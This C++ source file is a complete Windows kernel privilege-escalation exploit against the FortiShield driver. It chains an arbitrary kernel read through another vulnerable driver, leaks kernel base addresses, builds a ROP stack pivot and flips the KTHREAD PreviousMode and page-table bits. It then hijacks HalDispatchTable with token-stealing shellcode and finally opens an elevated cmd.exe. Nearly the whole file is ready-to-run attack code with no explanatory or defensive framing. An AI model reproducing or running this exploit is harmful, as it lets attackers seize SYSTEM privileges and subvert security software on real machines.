#include "stdafx.h"
#include <windows.h>
#include "ntos.h"
#include <stdio.h>
#include <stdlib.h>
#include <Psapi.h>
#include <Shlobj.h>

#pragma comment (lib,"psapi")
#pragma comment(lib, "ntdll_x64.lib")
#define EPROCESS_ThreadListHead_Offset 0x5e0
#define ETHREAD_ThreadListEntry_Offset 0x4e8
#define ETHREAD_Tcb_Offset             0x000
#define ETHREAD_Cid_Offset             0x478
#define CLIENTID_UniqueThread_Offset   0x8

extern "C" void TokenStealing();

typedef enum _SUPERFETCH_INFORMATION_CLASS
{
	SuperfetchRetrieveTrace = 0x1,
	SuperfetchSystemParameters = 0x2,
	SuperfetchLogEvent = 0x3,
	SuperfetchGenerateTrace = 0x4,
	SuperfetchPrefetch = 0x5,
	SuperfetchPfnQuery = 0x6,
	SuperfetchPfnSetPriority = 0x7,
	SuperfetchPrivSourceQuery = 0x8,
	SuperfetchSequenceNumberQuery = 0x9,
	SuperfetchScenarioPhase = 0xA,
	SuperfetchWorkerPriority = 0xB,
	SuperfetchScenarioQuery = 0xC,
	SuperfetchScenarioPrefetch = 0xD,
	SuperfetchRobustnessControl = 0xE,
	SuperfetchTimeControl = 0xF,
	SuperfetchMemoryListQuery = 0x10,
	SuperfetchMemoryRangesQuery = 0x11,
	SuperfetchTracingControl = 0x12,
	SuperfetchTrimWhileAgingControl = 0x13,
	SuperfetchInformationMax = 0x14,
} SUPERFETCH_INFORMATION_CLASS;
typedef NTSTATUS(WINAPI* _NtWriteVirtualMemory)(
	_In_ HANDLE ProcessHandle,
	_In_ PVOID BaseAddress,
	_In_ PVOID Buffer,
	_In_ ULONG NumberOfBytesToWrite,
	_Out_opt_ PULONG NumberOfBytesWritten
	);

typedef struct _SUPERFETCH_INFORMATION
{
	ULONG Version;
	ULONG Magic;
	SUPERFETCH_INFORMATION_CLASS InfoClass;
	PVOID Data;
	ULONG Length;
} SUPERFETCH_INFORMATION, * PSUPERFETCH_INFORMATION;

typedef enum _PFS_PRIVATE_PAGE_SOURCE_TYPE {
	PfsPrivateSourceKernel = 0x0,
	PfsPrivateSourceSession = 0x1,
	PfsPrivateSourceProcess = 0x2,
	PrfsPrivateSourceMax = 0x3,
} PFS_PRIVATE_PAGE_SOURCE_TYPE;

#pragma pack(push)
#pragma pack(4)

typedef struct _PFS_PRIVATE_PAGE_SOURCE
{
	PFS_PRIVATE_PAGE_SOURCE_TYPE Type;
	union {
		DWORD SessionId;
		DWORD ProcessId;
	};
	DWORD SpareDwords[2];
	ULONG ImagePathHash;
	ULONG UniqueProcessHash;
} PFS_PRIVATE_PAGE_SOURCE, * PPFS_PRIVATE_PAGE_SOURCE;

typedef struct _PF_PRIVSOURCE_INFO_V3 {
	PFS_PRIVATE_PAGE_SOURCE DbInfo;
	union {
		ULONG_PTR EProcess;
		ULONG_PTR GlobalVA;
	};
	ULONG WsPrivatePages;
	ULONG TotalPrivatePages;
	ULONG SessionID;
	CHAR ImageName[16];
	BYTE SpareBytes[12];
} PF_PRIVSOURCE_INFO_V3, * PPF_PRIVSOURCE_INFO_V3;

typedef struct _PF_PRIVSOURCE_INFO_V3PLUS {
	BYTE data2[8];
	DWORD ProcessId;
	BYTE data3[16];
	ULONG_PTR EProcess;
	BYTE data[60];
} PF_PRIVSOURCE_INFO_V3PLUS, * PPF_PRIVSOURCE_INFO_V3PLUS;

typedef struct _PF_PRIVSOURCE_QUERY_REQUEST {
	ULONG Version;

	union {
		__declspec(align(4)) struct {
			ULONG InfoCount;
			PF_PRIVSOURCE_INFO_V3 InfoArrayV3[1];
		} __sv3;
		__declspec(align(4)) struct {
			ULONG Type;
			ULONG InfoCount;
			PF_PRIVSOURCE_INFO_V3PLUS InfoArrayV3Plus[1];
		} __sv3plus;
	} __u0;
} PF_PRIVSOURCE_QUERY_REQUEST, * PPF_PRIVSOURCE_QUERY_REQUEST;

#pragma pack(pop)

typedef NTSTATUS(WINAPI* _NtQueryIntervalProfile)(
	DWORD junk,
	PULONG buffer
	);

ULONGLONG GetEprocessAddress(const char* target)
{
	ULONG superfetch_info_size;
	PF_PRIVSOURCE_QUERY_REQUEST* pf_privsource_query_request;
	SUPERFETCH_INFORMATION superfetch_info = { 0 };
	BYTE temp_buffer[0x70];

	ZeroMemory(temp_buffer, sizeof(temp_buffer));

	PPEB peb = (PPEB)NtCurrentTeb()->ProcessEnvironmentBlock;
	DWORD dwBuildNumber = peb->OSBuildNumber;

	*(DWORD*)temp_buffer = 8; // Windows 10

	switch (dwBuildNumber)
	{
	case 7600:
	case 7601:
		*(DWORD*)temp_buffer = 3;
		break;
	case 9200:
		*(DWORD*)temp_buffer = 5;
		break;
	case 9600:
		*(DWORD*)temp_buffer = 6;
		break;
	}
	*(DWORD*)&temp_buffer[4] = 0;

	superfetch_info.InfoClass = SuperfetchPrivSourceQuery;
	superfetch_info.Version = 45;
	superfetch_info.Magic = 'kuhC';
	superfetch_info.Data = temp_buffer;
	superfetch_info.Length = sizeof(temp_buffer);

	NTSTATUS status;
	ULONG pf_privsource_query_request_version = *(DWORD*)temp_buffer;

	status = NtQuerySystemInformation(SystemSuperfetchInformation, &superfetch_info, sizeof(SUPERFETCH_INFORMATION), &superfetch_info_size);

	pf_privsource_query_request = (PF_PRIVSOURCE_QUERY_REQUEST*)LocalAlloc(LPTR, 2 * superfetch_info_size);

	pf_privsource_query_request->__u0.__sv3.InfoCount = 0;
	pf_privsource_query_request->Version = pf_privsource_query_request_version;
	superfetch_info.Data = pf_privsource_query_request;
	superfetch_info.Length = 2 * superfetch_info_size;

	status = NtQuerySystemInformation(SystemSuperfetchInformation, &superfetch_info, sizeof(SUPERFETCH_INFORMATION), &superfetch_info_size);

	auto sv3plus_request = &pf_privsource_query_request->__u0.__sv3plus;
	const char* targetName = target;
	const char* procName;

	for (ULONG i = 0; i < sv3plus_request->InfoCount; ++i)
	{
		procName = (const char*)&sv3plus_request->InfoArrayV3Plus[i].data[0x14];

		if (strcmp(procName, targetName) == 0) {
			//printf("%15s\t%5d\t%p\n", procName, sv3plus_request->InfoArrayV3Plus[i].ProcessId, sv3plus_request->InfoArrayV3Plus[i].EProcess);
			return sv3plus_request->InfoArrayV3Plus[i].EProcess;
		}


	}

	LocalFree(pf_privsource_query_request);
}

PULONGLONG leak_buffer = (PULONGLONG)VirtualAlloc((LPVOID)0x000000001a000000, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
ULONGLONG leakQWORD(ULONGLONG addr, HANDLE driver)
{
	memset((LPVOID)0x000000001a000000, 0x11, 0x1000);
	memset((LPVOID)0x000000001a001000, 0x22, 0x1000);
	leak_buffer[0] = 0x000000001a000008;
	leak_buffer[1] = 0x0000000000000003;
	leak_buffer[4] = 0x000000001a000028;
	leak_buffer[6] = addr - 0x70;

	DWORD IoControlCode = 0x22608C;
	LPVOID InputBuffer = (LPVOID)0x000000001a000000;
	DWORD InputBufferLength = 0x20;
	LPVOID OutputBuffer = (LPVOID)0x000000001a001000;
	DWORD OutputBufferLength = 0x110;
	DWORD lpBytesReturned;

	BOOL triggerIOCTL;
	triggerIOCTL = DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, &lpBytesReturned, NULL);
	if (!triggerIOCTL)
	{
		//printf("[!] Error in the SYSCALL: %d\n", GetLastError());
	}

	ULONGLONG result = leak_buffer[0x202];
	return result;
}

ULONGLONG leakNtBase(HANDLE driver, ULONGLONG kthread)
{

	ULONGLONG ntAddr = leakQWORD(kthread + 0x2a8, driver);
	ULONGLONG baseAddr;
	ULONGLONG signature = 0x00905a4d;
	ULONGLONG searchAddr = (ntAddr - 0x300000) & 0xFFFFFFFFFFFFF000;

	while (TRUE)
	{
		ULONGLONG readData = leakQWORD(searchAddr, driver);
		ULONGLONG tmp = readData & 0xFFFFFFFF;

		//printf("%llx\n", readData);
		//printf("%llx\n", tmp);


		if (tmp == signature)
		{
			baseAddr = searchAddr;
			break;
		}
		searchAddr = searchAddr - 0x1000;
	}
	return baseAddr;
}

ULONGLONG leakFortiBase(HANDLE driver, ULONGLONG ntBase)
{
	ULONGLONG PsLoadModuleListAddr = ntBase + 0xc2a310;
	ULONGLONG searchAddr = leakQWORD(PsLoadModuleListAddr, driver);
	ULONGLONG addr = 0;
	while (1)
	{
		ULONGLONG namePointer = leakQWORD(searchAddr + 0x60, driver);
		ULONGLONG name = leakQWORD(namePointer, driver);
		if (name == 0x00740072006f0046)
		{
			name = leakQWORD(namePointer + 8, driver);
			if (name == 0x0069006800530069)
			{
				addr = leakQWORD(searchAddr + 0x30, driver);
				break;
			}
		}
		searchAddr = leakQWORD(searchAddr, driver);
	}
	return addr;
}

PULONGLONG allocate_fake_stack(ULONGLONG ntBase, ULONGLONG fortishield_callback, ULONGLONG fortishield_restore, ULONGLONG kThread)
{
	PULONGLONG fake_stack = (PULONGLONG)VirtualAlloc((LPVOID)0x00000000B60E0000, 0x14000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (fake_stack == NULL)
	{
		printf("[!] Error while allocating the fake stack: %d\n", GetLastError());
		exit(1);
	}
	memset(fake_stack, 0x90, 0x14000);

	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x00))[0] = (ULONGLONG)ntBase + 0x3f01bf;		// pop rax ; pop rcx ; ret
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x08))[0] = (ULONGLONG)fortishield_callback;		// Callback address
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x10))[0] = 0x0000000000000000;					// NULL
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x18))[0] = (ULONGLONG)ntBase + 0x2dd014;		// mov qword [rax], rcx ; ret
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x20))[0] = (ULONGLONG)ntBase + 0x3f01bf;		// pop rax ; pop rcx ; ret
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x28))[0] = (ULONGLONG)kThread + 0x232;			// KTHREAD.PreviousMode
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x30))[0] = 0x0000000000000000;					// NULL
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x38))[0] = (ULONGLONG)ntBase + 0x49584f;		// mov byte [rax], cl ; ret
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x40))[0] = (ULONGLONG)ntBase + 0x2017d0;		// pop rbx ; ret
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x48))[0] = 0x00000000b60f0110;					// Location on fake_stack
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x50))[0] = (ULONGLONG)ntBase + 0x2017f2;		// pop rax ; ret;
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x58))[0] = (ULONGLONG)ntBase + 0x217527;		// mov rax, rcx ; add rsp, 0x28 ; ret
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x60))[0] = (ULONGLONG)ntBase + 0x3cd671;		// mov rcx, rsi ; call rax
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x68))[0] = 0x0000000000000000;					// NULL
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x70))[0] = 0x0000000000000000;					// NULL
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x78))[0] = 0x0000000000000000;					// NULL
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x80))[0] = 0x0000000000000000;					// NULL
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x88))[0] = (ULONGLONG)ntBase + 0x20de71;		// pop rcx ; ret
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x90))[0] = 0x0000000000000028;					// Value to subtract to get RSP
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0x98))[0] = (ULONGLONG)ntBase + 0x029db2b;		// sub rax, rcx ; ret
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0xa0))[0] = (ULONGLONG)ntBase + 0x20de71;		// pop rcx ; ret
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0xa8))[0] = (ULONGLONG)fortishield_restore;		// Restore address
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0xb0))[0] = (ULONGLONG)ntBase + 0x2dd014;		// mov qword [rax], rcx ; ret
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0xb8))[0] = (ULONGLONG)ntBase + 0x2b82ce;		// mov qword [rbx], rax ; add rsp, 0x20 ; pop rbx ; ret
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0xc0))[0] = 0x0000000000000000;					// NULL
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0xc8))[0] = 0x0000000000000000;					// NULL
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0xd0))[0] = 0x0000000000000000;					// NULL
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0xd8))[0] = 0x0000000000000000;					// NULL
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0xe0))[0] = 0x0000000000000000;					// Restore RBX
	((PDWORD64)((DWORD64)fake_stack + 0x10020 + 0xe8))[0] = (ULONGLONG)ntBase + 0x201380;		// pop rsp ; ret
	return fake_stack;
}

ULONGLONG get_pxe_address_64(ULONGLONG address, ULONGLONG pte_start)
{
	ULONGLONG result = address >> 9;
	result = result | pte_start;
	result = result & (pte_start + 0x0000007ffffffff8);
	return result;
}

ULONGLONG walkEprocess(HANDLE driver, ULONGLONG eProcess) {
	DWORD currentTid = GetCurrentThreadId();

	ULONGLONG listHead = eProcess + EPROCESS_ThreadListHead_Offset;
	ULONGLONG flink = leakQWORD(listHead, driver);

	while (flink != listHead) {
		ULONGLONG ethread = flink - ETHREAD_ThreadListEntry_Offset;

		ULONGLONG uniqueTid = leakQWORD(ethread + ETHREAD_Cid_Offset + CLIENTID_UniqueThread_Offset, driver);

		if ((DWORD)uniqueTid == currentTid) {
			ULONGLONG kthread = ethread;  // Tcb is at offset 0x0
			printf("[+] Found current thread:\n");
			printf("[+] ETHREAD: 0x%llx\n", ethread);
			printf("[+] KTHREAD: 0x%llx\n", kthread);
			return kthread;
		}

		flink = leakQWORD(flink, driver);  // Move to next thread
	}

	printf("[-] Current thread not found in EPROCESS thread list.\n");
}

int trigger_callback()
{
	printf("[+] Creating dummy file\n");
	system("echo test > C:\\Users\\n00b\\AppData\\LocalLow\\test.txt");
	printf("[+] Creating dummy file 2\n");
	system("echo test > C:\\Users\\n00b\\AppData\\LocalLow\\test3.txt");
	printf("[+] Calling MoveFileEx()\n");

	BOOL MFEresult = MoveFileEx(L"C:\\Users\\n00b\\AppData\\LocalLow\\test.txt", L"C:\\Users\\n00b\\AppData\\LocalLow\\test2.txt", MOVEFILE_REPLACE_EXISTING);
	if (MFEresult == 0)
	{
		printf("[!] Error while calling MoveFileEx(): %d\n", GetLastError());
		return 1;
	}
	return 0;
}

int main()
{

	HANDLE mdare = CreateFile(L"\\\\.\\mdareDriver_48", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (mdare == INVALID_HANDLE_VALUE)
	{
		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
		return 1;
	}

	HANDLE forti = CreateFile(L"\\\\.\\FortiShield", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (forti == INVALID_HANDLE_VALUE)
	{
		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
		return 1;
	}

	ULONGLONG eProcess;
	const char* forti_exploit = "kstack.exe";
	eProcess = GetEprocessAddress(forti_exploit);
	printf("[+] EPROCESS found %p\n", eProcess);
	ULONGLONG kThread = walkEprocess(mdare, eProcess);
	ULONGLONG ntBase = leakNtBase(mdare, kThread);
	printf("[+] ntoskrnl.exe base address is: 0x%llx\n", ntBase);
	ULONGLONG ntPivot = ntBase + 0x20bbc2; // mov esp, 0xB60F0020 ; ret // mov esp, 0xf6000000; retn;
	printf("[+] stack pivot gadget found: 0x%llx\n", ntPivot);
	ULONGLONG ntMiGetPteAddressOffset = leakQWORD(ntBase + 0x33273B, mdare);
	printf("[+] ntMiGetPteAddressOffset is: 0x%llx\n", ntMiGetPteAddressOffset);
	ULONGLONG fortishieldBase = leakFortiBase(mdare, ntBase);
	printf("[+] FortiShield.sys base address is: 0x%llx\n", fortishieldBase);
	ULONGLONG fortishield_callback = fortishieldBase + 0xd150;
	ULONGLONG fortishield_restore = fortishieldBase + 0x2f73;

	printf("[+] PTE VA start address is: 0x%llx\n", ntMiGetPteAddressOffset);


	ULONGLONG pte_result = get_pxe_address_64(0xB60f0000, ntMiGetPteAddressOffset);
	printf("[+] PTE virtual address for 0x0B60F0100: %I64x\n", pte_result);
	PULONGLONG fake_stack = allocate_fake_stack(ntBase, fortishield_callback, fortishield_restore, kThread);

	DWORD IoControlCode = 0x220028;
	ULONGLONG InputBuffer = ntPivot;
	DWORD InputBufferLength = 0x8;
	ULONGLONG OutputBuffer = 0x0;
	DWORD OutputBufferLength = 0x0;
	DWORD lpBytesReturned;

	getchar();

	BOOL triggerIOCTL = DeviceIoControl(forti, IoControlCode, (LPVOID)&InputBuffer, InputBufferLength, (LPVOID)&OutputBuffer, OutputBufferLength, &lpBytesReturned, NULL);
	getchar();
	trigger_callback();
	Sleep(2000);
	LPVOID read_qword = malloc(sizeof(ULONGLONG));
	SIZE_T read_bytes;
	memset(read_qword, 0x00, sizeof(ULONGLONG));

	PULONGLONG ppte_base = &ntMiGetPteAddressOffset;
	if (ppte_base == 0)
	{
		printf("[!] Error while reading from nt!MiGetPteAddress + 0x13\n");
		exit(1);
	}
	printf("[+] PTE base address: %llx \n", *ppte_base);

	ULONGLONG shellcode = 0x00000002a0000000;
	LPVOID allocation_sc = VirtualAlloc((LPVOID)shellcode, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (allocation_sc == NULL)
	{
		printf("[!] Error while allocating memory for the input buffer: %d\n", GetLastError());
		exit(1);
	}
	memset(allocation_sc, 0x90, 0x1000);

	memcpy((LPVOID)((ULONGLONG)allocation_sc + 0x08), &TokenStealing, 0xc0);
	((PDWORD64)((DWORD64)allocation_sc + 0x80))[0] = fortishield_callback;
	((PDWORD64)((DWORD64)allocation_sc + 0x88))[0] = fortishield_restore;

	ULONGLONG pte_base = (ULONGLONG)*ppte_base;
	ULONGLONG pte_va = get_pxe_address_64(0x00000002a0000000, pte_base);

	memset(read_qword, 0x00, sizeof(ULONGLONG));
	if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)pte_va, read_qword, sizeof(ULONGLONG), &read_bytes))
	{
		printf("[!] Error while calling ReadProcessMemory(): %d\n", GetLastError());
	}
	PULONGLONG ppte_entry = (PULONGLONG)((ULONG_PTR*)read_qword);
	printf("[+] PTE flags: %llx \n", *ppte_entry);
	//Flip U/S bit
	ULONGLONG write_what = (ULONGLONG)*ppte_entry ^ 1 << 2;
	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	if (!pNtWriteVirtualMemory)
	{
		printf("[!] Error while resolving NtWriteVirtualMemory: %d\n", GetLastError());
		exit(1);
	}
	pNtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)pte_va, &write_what, sizeof(ULONGLONG), NULL);


	ULONGLONG HaliQuerySystemInformation = (ULONGLONG)ntBase + 0xc00a68;
	if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)HaliQuerySystemInformation, read_qword, sizeof(ULONGLONG), &read_bytes))
	{
		printf("[!] Error while calling ReadProcessMemory(): %d\n", GetLastError());
	}
	PULONGLONG orig_HaliQuerySystemInformation = (PULONGLONG)((ULONG_PTR*)read_qword);
	printf("[+] Oringial HaliQuerySystemInformation Address: %llx \n", *orig_HaliQuerySystemInformation);
	((PDWORD64)((DWORD64)fake_stack + 0x10200))[0] = (ULONGLONG)*orig_HaliQuerySystemInformation;

	getchar();
	write_what = (ULONGLONG)shellcode;
	pNtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)((ULONGLONG)HaliQuerySystemInformation), &write_what, sizeof(ULONGLONG), NULL);
	_NtQueryIntervalProfile pNtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryIntervalProfile");
	if (!pNtQueryIntervalProfile)
	{
		printf("[!] Error while resolving NtQueryIntervalProfile: %d\n", GetLastError());
		exit(1);
	}
	ULONG trash;
	pNtQueryIntervalProfile(2, &trash);
	getchar();
	Sleep(2000);
	//restore the HalDispatchTable
	write_what = (ULONGLONG)*orig_HaliQuerySystemInformation;
	pNtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)((ULONGLONG)HaliQuerySystemInformation), &write_what, sizeof(ULONGLONG), NULL);
	//restore Previous Mode on the KThread
	memset(read_qword, 0x00, sizeof(ULONGLONG));
	if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)((ULONGLONG)kThread + 0x232), read_qword, sizeof(ULONGLONG), &read_bytes))
	{
		printf("[!] Error while calling ReadProcessMemory(): %d\n", GetLastError());
	}
	PULONGLONG kThreadPM = (PULONGLONG)((ULONG_PTR*)read_qword);
	write_what = (ULONGLONG)*kThreadPM ^ 1 << 0;
	pNtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)((ULONGLONG)kThread + 0x232), &write_what, sizeof(ULONGLONG), NULL);
	system("start cmd.exe");

	return 0;
}
